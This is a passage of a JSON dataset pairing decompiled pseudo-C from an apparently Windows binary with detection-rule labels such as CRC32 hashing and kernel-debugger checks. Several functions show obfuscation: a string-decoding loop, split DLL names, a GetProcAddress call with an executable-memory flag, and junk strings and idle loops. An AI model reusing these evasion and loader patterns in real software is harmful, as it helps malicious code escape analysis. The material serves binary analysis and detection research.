   uint32_t uVar6;\n    int32_t **in_FS_OFFSET;\n    uint64_t uVar7;\n    uint uStack172;\n    uint uStack168;\n    uint8_t uStack137;\n    uint32_t uStack136;\n    uint uStack131;\n    uint uStack127;\n    uint uStack123;\n    ushort uStack119;\n    uchar uStack117;\n    uint uStack116;\n    char cStack112;\n    char cStack111;\n    char cStack110;\n    char cStack109;\n    char cStack108;\n    char cStack107;\n    char cStack106;\n    uchar uStack105;\n    ulong uStack104;\n    uint32_t uStack96;\n    int32_t iStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint32_t uStack80;\n    int32_t iStack76;\n    ulong uStack72;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffef0;\n    uStack72 = CONCAT44(noname_14, arg_3ch);\n    uStack104 = CONCAT44(noname_4, arg_14h);\n    uStack28 = 0x417f10;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = arg_74h;\n    uStack48 = arg_70h;\n    uStack52 = arg_60h;\n    uStack56 = arg_5ch;\n    uStack60 = arg_50h;\n    uStack64 = arg_4ch;\n    iStack76 = arg_30h;\n    uStack80 = arg_2ch;\n    iStack84 = arg_28h;\n    uStack88 = arg_24h;\n    iStack92 = arg_20h;\n    uStack96 = arg_1ch;\n    cStack106 = '\\x01';\n    while (cStack106 != '\\0') {\n        cStack106 = '\\0';\n    }\n    cStack107 = '\\x01';\n    while (cStack107 != '\\0') {\n        cStack107 = '\\0';\n    }\n    cStack108 = '\\x01';\n    while (cStack108 != '\\0') {\n        cStack108 = '\\0';\n    }\n    cStack109 = '\\x01';\n    while (cStack109 != '\\0') {\n        cStack109 = '\\0';\n    }\n    cStack110 = '\\x01';\n    while (cStack110 != '\\0') {\n        cStack110 = '\\0';\n    }\n    cStack111 = '\\x01';\n    while (cStack111 != '\\0') {\n        cStack111 = '\\0';\n    }\n    cStack112 = '\\x01';\n    while (cStack112 != '\\0') {\n        cStack112 = '\\0';\n    }\n    uStack24 = 0xffffffff;\n    uStack105 = 1;\n    uVar2 = arg_10h * 0x101c;\n    uVar3 = uVar2 * arg_1ch;\n    uVar4 = arg_24h * 0x19c;\n    uVar6 = arg_2ch - uVar4;\n    fcn.00404caa(uVar3 + uVar6, \n                 (uVar2 * arg_1ch >> 0x20) + uVar2 * arg_20h + (uVar2 >> 0x1f) * arg_1ch +\n                 ((arg_30h - ((arg_24h * 0x19c >> 0x20) + arg_28h * 0x19c)) - (arg_2ch < uVar4)) + CARRY4(uVar3, uVar6))\n    ;\n    uStack116 = 0xfb30264a;\n    uStack131 = *0x4ec418;\n    uStack127 = *0x4ec41c;\n    uStack123 = *0x4ec420;\n    uStack119 = *0x4ec424;\n    uStack117 = *0x4ec426;\n    for (uStack136 = 0; uStack136 < 0xf; uStack136 = uStack136 + 1) {\n        uVar1 = ((*(&uStack131 + uStack136) ^ 0x10) >> 2 | *(&uStack131 + uStack136) << 6) - 0x2a;\n        uVar1 = uStack136 - ((-(uVar1 >> 3 | uVar1 * ' ') ^ 99) - 0x29 ^ 0xeb);\n        uVar1 = ((uVar1 >> 6 | uVar1 * '\\x04') ^ 0x62) - 0xe ^ 0xff;\n        uStack137 = uVar1 >> 1 | uVar1 << 7;\n        *(&uStack131 + uStack136) = uStack137;\n    }\n    uStack24 = 0xffffffff;\n    fcn.00401e79(\"kerne\");\n    uStack24 = 0;\n    fcn.004042af(\"l32.dll\");\n    uVar5 = fcn.004052c7();\n    uStack168 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar5);\n    uStack172 = 0;\n    *0x573ba8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack168, &uStack131);\n    (**0x573ba8)(arg_8h, arg_ch, 0x40, &uStack172);\n    uVar7 = fcn.00404840(arg_54h, 0, uStack56, uStack52);\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return uVar7 & 0xffffffff00000000 | uVar7 ^ arg_78h;\n}\n",
        "token_count": 1655
    },
    "004068ac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004068ac(uint *arg_8h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_18h;\n    char *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x574458 == 'X') {\n        var_10h = \"void\";\n        var_ch = 4;\n    }\n    else {\n        if (**0x574458 != 'Z') {\n            fcn.004045f2(&var_8h);\n            if (var_4h == '\\0') {\n                cVar1 = **0x574458;\n                if (cVar1 != '\\0') {\n                    if (cVar1 != '@') {\n                        if (cVar1 != 'Z') {\n                            arg_8h[1] = 0;\n                            *arg_8h = 0;\n                            *(arg_8h + 1) = 2;\n                            return arg_8h;\n                        }\n                        *0x574458 = *0x574458 + 1;\n                        if ((~(*0x574460 >> 0x12) & 1) == 0) {\n                            var_10h = \",<ellipsis>\";\n                            var_ch = 0xb;\n                        }\n                        else {\n                            var_10h = \",...\";\n                            var_ch = 4;\n                        }\n                        puVar2 = fcn.00405164(&var_18h, &var_10h);\n                        *arg_8h = *puVar2;\n                        arg_8h[1] = puVar2[1];\n                        return arg_8h;\n                    }\n                    *0x574458 = *0x574458 + 1;\n                }\n            }\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n        if ((~(*0x574460 >> 0x12) & 1) == 0) {\n            var_10h = \"<ellipsis>\";\n            var_ch = 10;\n        }\n        else {\n            var_10h = 0x5557e0;\n            var_ch = 3;\n        }\n    }\n    *0x574458 = *0x574458 + 1;\n    fcn.00402d47(&var_10h);\n    return arg_8h;\n}\n",
        "token_count": 528
    },
    "004068ed": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint fcn.004068ed(void)\n\n{\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    for (var_ch = 0x45; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x31; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    return 0;\n}\n",
        "token_count": 114
    },
    "00406965": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00406965(uint *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar1 = **0x574458;\n    pcVar5 = *0x574458;\n    if (cVar1 == '\\0') {\ncode_r0x0048fd63:\n        *0x574458 = pcVar5;\n        fcn.0040129e(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    if ((('5' < cVar1) && (cVar1 < ':')) || (cVar1 == '_')) {\n        uVar6 = cVar1 - 0x36;\n        pcVar5 = *0x574458 + 1;\n        if (uVar6 == 0x29) {\n            if (*pcVar5 == '\\0') goto code_r0x0048fd63;\n            *0x574458 = *0x574458 + 2;\n            uVar6 = *pcVar5 - 0x3d;\n            if ((uVar6 < 4) || (7 < uVar6)) {\n                uVar6 = 0xffffffff;\n            }\n        }\n        else {\n            *0x574458 = pcVar5;\n            if ((uVar6 < 0) || (3 < uVar6)) goto code_r0x0048fd53;\n        }\n        if (uVar6 != 0xffffffff) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = *arg_ch;\n            var_4h = arg_ch[1];\n            if ((uVar6 & 2) != 0) {\n                if (**0x574458 == '@') {\n                    *0x574458 = *0x574458 + 1;\n                }\n                else {\n                    var_14h = 2;\n                    var_18h = 0x555750;\n                    fcn.00402d47(&var_18h);\n                    fcn.004053b7(&var_18h, &var_8h);\n                    var_8h = var_18h;\n                    var_4h = var_14h;\n                    if (**0x574458 == '\\0') {\n                        fcn.004017df(1);\n                        fcn.004053b7(&var_18h, &var_8h);\n                        var_8h = var_18h;\n                        var_4h = var_14h;\n                    }\n                    else {\n                        uVar2 = fcn.00403a80(&var_28h);\n                        fcn.00402eb4(&var_18h, 0x20, uVar2);\n                        piVar3 = fcn.004053b7(&var_30h, &var_8h);\n                        var_8h = *piVar3;\n                        var_4h = piVar3[1];\n                    }\n                }\n                if (**0x574458 == '\\0') {\n                    fcn.004017df(1);\n                    fcn.004053b7(arg_8h, &var_8h);\n                    return arg_8h;\n                }\n                if (**0x574458 != '@') goto code_r0x0048fd53;\n                *0x574458 = *0x574458 + 1;\n                if ((*0x574460 & 0x60) == 0x60) {\n                    uVar2 = fcn.00405871(&var_30h);\n                    fcn.00406a05(uVar2);\n                }\n                else {\n                    puVar4 = fcn.00405871(&var_30h);\n                    var_10h = *puVar4;\n                    var_ch = puVar4[1];\n                }\n            }\n            if ((uVar6 & 4) != 0) {\n                if ((~(*0x574460 >> 1) & 1) == 0) {\n                    uVar2 = fcn.004051a0(&var_30h);\n                    fcn.00406a05(uVar2);\n                }\n                else {\n                    uVar2 = fcn.004051a0(&var_30h);\n                    fcn.00402eb4(&var_28h, 0x20, uVar2);\n                    piVar3 = fcn.004053b7(&var_18h, &var_8h);\n                    var_8h = *piVar3;\n                    var_4h = piVar3[1];\n                }\n            }\n            if ((~(*0x574460 >> 1) & 1) == 0) {\n                uVar2 = fcn.004039cc(&var_30h);\n                fcn.00406a05(uVar2);\n            }\n            else {\n                fcn.004039cc(&var_30h);\n                piVar3 = fcn.004053b7(&var_28h, &var_8h);\n                var_8h = *piVar3;\n                var_4h = piVar3[1];\n            }\n            if (*arg_ch != 0) {\n                fcn.00402eb4(&var_30h, 0x28, &var_8h);\n                piVar3 = fcn.0040330f(&var_28h, 0x29);\n                var_8h = *piVar3;\n                var_4h = piVar3[1];\n            }\n            piVar3 = fcn.0040528b(8);\n            if (piVar3 == NULL) {\n                piVar3 = NULL;\n            }\n            else {\n                *piVar3 = 0;\n                piVar3[1] = 0;\n            }\n            fcn.0040420a(&var_20h, piVar3);\n            uVar2 = fcn.004068ac(&var_30h);\n            fcn.00402eb4(&var_28h, 0x28, uVar2);\n            uVar2 = fcn.0040330f(&var_18h, 0x29);\n            fcn.00402eeb(uVar2);\n            if (((*0x574460 & 0x60) != 0x60) && ((uVar6 & 2) != 0)) {\n                fcn.00402eeb(&var_10h);\n            }\n            if ((~(*0x574460 >> 0x13) & 1) == 0) {\n                uVar2 = fcn.00402365(&var_30h);\n                fcn.00406a05(uVar2);\n            }\n            else {\n                uVar2 = fcn.00402365(&var_30h);\n                fcn.00402eeb(uVar2);\n            }\n            uVar2 = fcn.00401e01(&var_30h);\n            fcn.00402eeb(uVar2);\n            if ((~(*0x574460 >> 8) & 1) == 0) {\n                uVar2 = fcn.00405aa1(&var_30h);\n                fcn.00406a05(uVar2);\n            }\n            else {\n                uVar2 = fcn.00405aa1(&var_30h);\n                fcn.00402eeb(uVar2);\n            }\n            if (piVar3 != NULL) {\n                *piVar3 = var_8h;\n                piVar3[1] = var_4h;\n                *arg_8h = var_20h;\n                arg_8h[1] = var_1ch;\n                return arg_8h;\n            }\n            arg_8h[1] = 0;\n            *(arg_8h + 1) = 3;\n            *arg_8h = 0;\n            return arg_8h;\n        }\n    }\ncode_r0x0048fd53:\n    arg_8h[1] = 0;\n    *arg_8h = 0;\n    *(arg_8h + 1) = 2;\n    return arg_8h;\n}\n",
        "token_count": 1884
    },
    "00406988": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl\nfcn.00406988(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack256;\n    uchar auStack252 [24];\n    uchar auStack228 [24];\n    int32_t iStack204;\n    uchar auStack200 [24];\n    uchar auStack176 [24];\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uchar uStack137;\n    uint uStack136;\n    uint uStack132;\n    uchar uStack126;\n    uchar uStack125;\n    uint uStack124;\n    uchar uStack93;\n    ulong uStack64;\n    uint8_t uStack49;\n    ulong uStack48;\n    uint8_t uStack37;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffef0;\n    uStack48 = CONCAT44(noname_4, arg_14h);\n    uStack64 = CONCAT44(noname_1, arg_8h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x450140;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack37 = arg_20h & 1;\n    uStack49 = arg_10h & 1;\n    fcn.00401e79(\"tsjpkpvikzfrrzbqcoikljwfvievhacydzfjoaygmmsnknzjflsfhvfqfukkfwnmwzmmlemf\");\n    uStack93 = 1;\n    uStack24 = 0;\n    fcn.00401e79(\"icptnjtqvmorchowgoxaqdsajgkeiqc\");\n    uStack124 = 0x756;\n    uStack125 = 1;\n    uStack126 = 1;\n    uStack132 = 0x40c76800;\n    uStack136 = 0;\n    uStack137 = 1;\n    uStack144 = 0xb44;\n    uStack148 = 0x40c19180;\n    uStack152 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"tsjpkpvikzfrrzbqcoikljwfvievhacydzfjoaygmmsnknzjflsfhvfqfukkfwnmwzmmlemf\");\n    uStack24 = 3;\n    fcn.00401e79(\"tsjpkpvikzfrrzbqcoikljwfvievhacydzfjoaygmmsnknzjflsfhvfqfukkfwnmwzmmlemf\");\n    uVar1 = fcn.004042dc(auStack200, auStack176);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack204 = 0x42; 0 < iStack204; iStack204 = iStack204 + -1) {\n        }\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"tsjpkpvikzfrrzbqcoikljwfvievhacydzfjoaygmmsnknzjflsfhvfqfukkfwnmwzmmlemf\");\n    uStack24 = 2;\n    fcn.00401e79(\"tsjpkpvikzfrrzbqcoikljwfvievhacydzfjoaygmmsnknzjflsfhvfqfukkfwnmwzmmlemf\");\n    uVar1 = fcn.004042dc(auStack252, auStack228);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack256 = 0x40; 0 < iStack256; iStack256 = iStack256 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0xd48e;\n}\n",
        "token_count": 1004
    },
    "004069e2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004069e2(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uStack12;\n    \n    if (arg_10h == 0x3000) {\n        uStack12 = 0xd;\n    }\n    else if ((SBORROW4(arg_ch, arg_8h == 0) != false) == arg_ch - (arg_8h == 0) < 0) {\n        uStack12 = arg_8h;\n    }\n    else if ((arg_8h | arg_ch) == 0) {\n        if (arg_10h == 0) {\n            uStack12 = 1;\n        }\n        else {\n            uStack12 = 0;\n        }\n    }\n    else {\n        uStack12 = 6;\n    }\n    return CONCAT44(arg_10h, uStack12);\n}\n",
        "token_count": 202
    },
    "0041e620": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0041e620(uint arg_8h, int32_t arg_ch)\n\n{\n    uint arg_8h_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    bool var_5h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00406645();\n    uVar1 = fcn.00402cf2(arg_8h_00);\n    var_5h = false;\n    if ((uVar1 & 1) != 0) {\n        iVar2 = fcn.004035e9();\n        var_5h = iVar2 == arg_ch;\n    }\n    return var_5h;\n}\n",
        "token_count": 159
    },
    "0041e6a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint8_t __cdecl fcn.0041e6a0(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t *in_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    \n    (**(*in_ECX + 0xc))(&var_10h, arg_8h);\n    uVar1 = fcn.00405ac9(&var_10h, arg_ch);\n    return uVar1 & 1;\n}\n",
        "token_count": 118
    },
    "00420b30": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00420b30(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint uVar3;\n    uint in_ECX;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_0000001c;\n    uint uStack160;\n    uint uStack156;\n    uint uStack116;\n    int32_t iStack112;\n    int32_t iStack108;\n    ulong uStack104;\n    uchar uStack90;\n    uint8_t uStack89;\n    uint32_t uStack88;\n    uchar auStack84 [36];\n    uint64_t uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff20;\n    uStack48 = CONCAT44(in_stack_0000001c, arg_1ch);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x427120;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.004040a7();\n    uStack88 = fcn.004017c1();\n    uStack88 = uStack88 & 0x3000;\n    uStack89 = uStack88 == 0x2000;\n    uStack90 = uStack88 == 0x3000;\n    if (uStack90) {\n        uStack104 = 0xffffffffffffffff;\n    }\n    else {\n        uStack104 = fcn.00402789();\n    }\n    uStack156 = uStack104 >> 0x20;\n    uStack160 = uStack104;\n    iStack112 = fcn.004069e2(uStack160, uStack156, uStack88);\n    iStack108 = iStack112;\n    if (((uStack89 & 1) != 0) && (*0x4ec3a8 < (uStack48 & *0x4ec3c0))) {\n        fcn.00404142(uStack48, uStack48 >> 0x20, &uStack116);\n        iVar1 = fcn.004026b2(uStack116);\n        iStack112 = (iVar1 * 0x7597) / 100000 + iStack112;\n    }\n    uStack24 = 0;\n    fcn.00404aac(iStack112 + 0x32, 0);\n    uVar3 = uStack104;\n    uVar2 = fcn.004017c1();\n    uVar2 = fcn.004044da(in_ECX, auStack84, 0x4c, uVar2);\n    arg_ch_00 = fcn.0040458e();\n    arg_8h_00 = fcn.00401b68(0);\n    uVar3 = fcn.004055b5(arg_8h_00, arg_ch_00, uVar2, uVar3);\n    uVar2 = fcn.004052c7();\n    fcn.00403864(in_ECX, arg_8h, arg_ch, noname_2, arg_14h, arg_18h, uVar2, uVar3);\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 818
    },
    "00420ee0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00420ee0(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint uVar3;\n    uint in_ECX;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_0000001c;\n    uint uStack160;\n    uint uStack156;\n    uint uStack116;\n    int32_t iStack112;\n    int32_t iStack108;\n    ulong uStack104;\n    uchar uStack90;\n    uint8_t uStack89;\n    uint32_t uStack88;\n    uchar auStack84 [36];\n    uint64_t uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff20;\n    uStack48 = CONCAT44(in_stack_0000001c, arg_1ch);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x427140;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.004040a7();\n    uStack88 = fcn.004017c1();\n    uStack88 = uStack88 & 0x3000;\n    uStack89 = uStack88 == 0x2000;\n    uStack90 = uStack88 == 0x3000;\n    if (uStack90) {\n        uStack104 = 0xffffffffffffffff;\n    }\n    else {\n        uStack104 = fcn.00402789();\n    }\n    uStack156 = uStack104 >> 0x20;\n    uStack160 = uStack104;\n    iStack112 = fcn.00401f6e(uStack160, uStack156, uStack88);\n    iStack108 = iStack112;\n    if (((uStack89 & 1) != 0) && (*0x4ec3a8 < (uStack48 & *0x4ec3c0))) {\n        fcn.00405d58(uStack48, uStack48 >> 0x20, &uStack116);\n        iVar1 = fcn.004026b2(uStack116);\n        iStack112 = (iVar1 * 0x7597) / 100000 + iStack112;\n    }\n    uStack24 = 0;\n    fcn.00404aac(iStack112 + 0x32, 0);\n    uVar3 = uStack104;\n    uVar2 = fcn.004017c1();\n    uVar2 = fcn.004044da(in_ECX, auStack84, 0, uVar2);\n    arg_ch_00 = fcn.0040458e();\n    arg_8h_00 = fcn.00401b68(0);\n    uVar3 = fcn.004055b5(arg_8h_00, arg_ch_00, uVar2, uVar3);\n    uVar2 = fcn.004052c7();\n    fcn.00403864(in_ECX, arg_8h, arg_ch, noname_2, arg_14h, arg_18h, uVar2, uVar3);\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 817
    },
    "00421790": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00421790(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint arg_1ch_00;\n    uint arg_18h_00;\n    int32_t *in_ECX;\n    int32_t *in_FS_OFFSET;\n    ulong uVar4;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a4h;\n    uint var_9ch;\n    uint var_94h;\n    uint var_8ch;\n    uint var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint8_t var_1dh;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    _arg_ch = CONCAT44(noname_2, arg_ch);\n    var_1ch = &stack0xffffff10;\n    var_10h = 0xffffffff;\n    var_14h = 0x427160;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_1dh = arg_1ch & 1;\n    uVar1 = fcn.004017c1();\n    if ((uVar1 & 0x4000) == 0) {\n        var_2ch = arg_ch;\n        var_28h = noname_2;\n        (**(*in_ECX + 0x24))();\n        goto code_r0x00421b1b;\n    }\n    fcn.00402f81(&var_38h);\n    var_10h = 0;\n    var_30h = fcn.00406433(&var_38h);\n    fcn.00405146();\n    fcn.004040a7();\n    if ((var_1dh & 1) == 0) {\n        var_10h = 1;\n        fcn.00402fbd(&var_80h);\n        fcn.004048b3(&var_80h);\n        fcn.00403b02();\n    }\n    else {\n        var_10h = 1;\n        fcn.00405ec5(&var_68h);\n        fcn.004048b3(&var_68h);\n        fcn.00403b02();\n    }\n    uVar4 = fcn.0040199c();\n    iVar3 = uVar4 >> 0x20;\n    uVar1 = uVar4 == 0;\n    if ((SBORROW4(iVar3, uVar1) != false) == iVar3 - uVar1 < 0) {\n        uVar1 = fcn.0040199c();\n        uVar2 = fcn.0040458e();\n        if (uVar1 <= uVar2) goto code_r0x0042197f;\n        var_84h = fcn.0040199c();\n        iVar3 = fcn.0040458e();\n        var_84h = var_84h - iVar3;\n    }\n    else {\ncode_r0x0042197f:\n        var_84h = 0;\n    }\n    uVar1 = fcn.004017c1();\n    if ((uVar1 & 0x1c0) != 0x40) {\n        _var_94h = _arg_ch;\n        fcn.004029aa(in_ECX, &var_8ch, arg_ch, noname_2, arg_18h, var_84h);\n        _arg_ch = CONCAT44(var_88h, var_8ch);\n        var_84h = 0;\n    }\n    arg_1ch_00 = fcn.0040458e();\n    arg_18h_00 = fcn.004052c7();\n    fcn.00401aaf(in_ECX, &var_9ch, _arg_ch, _arg_ch >> 0x20, arg_18h_00, arg_1ch_00);\n    fcn.004047d2(0, 0);\n    fcn.004029aa(in_ECX, arg_8h, _var_9ch, _var_9ch >> 0x20, arg_18h, var_84h);\n    fcn.00403b02();\ncode_r0x00421b1b:\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 1147
    },
    "00461bac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00461bac(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.type_info.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "004635d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004635d0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.0040314d();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "004635fa": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004635fa(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4e4e30;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    *in_ECX = vtable.std::ios_base.0;\n    fcn.004069bf(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 168
    },
    "0046366e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0046366e(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.00401f96();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX + -8);\n    }\n    return in_ECX + -8;\n}\n",
        "token_count": 84
    },
    "0046369c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046369c(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00405948();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "004636c6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
